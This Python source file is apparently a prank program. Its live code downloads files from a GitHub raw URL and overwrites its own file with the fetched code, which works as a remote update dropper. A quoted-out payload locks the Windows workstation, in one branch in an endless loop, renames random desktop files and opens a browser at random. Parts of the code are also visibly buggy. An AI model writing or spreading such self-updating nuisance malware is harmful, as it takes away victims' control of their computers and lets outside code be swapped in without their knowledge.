# new version
import requests
import os

# check for updates
check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/Check%20for%20update"
response = requests.get(check_for_update).content.decode('utf-8').split("\n")

# main code updating
if "main.pyw" in str(response):
    check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/main.pyw"
    update_main = requests.get(check_for_update)
    open(os.path.basename(__file__), "wb").write(update_main.content) 

for x in range(len(response)-1):#
    response = requests.get(check_for_update).content.decode('utf-8').split("\n")
    if response[x] == "main.pyw":
        pass
    else:
        try:
            requests.get(response[x])
        except:
            check_for_update = f"https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/{response[x]}"
            name = str(response[x])
            response = requests.get(check_for_update)
            open("test", "wb").write(response.content) 
       

"""
import os
import ctypes
import random
import time
import webbrowser

def change_desktop_icon():
    try:
        desktop_path = f"C:/Users/{os.getlogin()}/Desktop"
        os.listdir(desktop_path)
    except:
        desktop_path = f"c:/Users/{os.getlogin()}/OneDrive/Desktop"
        os.listdir(desktop_path)
    
    file_name = os.listdir(desktop_path)[random.randint(0, len(os.listdir(desktop_path)))]
    old_path =  f"{desktop_path}/{file_name}"
    name, ext = file_name.split(".")
    new_name = f"{desktop_path}/{name}sus.{ext}"
    print(new_name)
    os.rename(old_path, new_name)

def logout():
    ctypes.windll.user32.LockWorkStation()

def web():
    webbrowser.open("https://www.msn.com/en-gb")

while True:
    random_number = random.randint(1,3)

    if random_number == 1:
        time.sleep(random.randint(600, 3600))
        logout()
        change_desktop_icon()

    if random_number == 2:
        while True:
            logout()

    if random_number == 3:
        web()"""
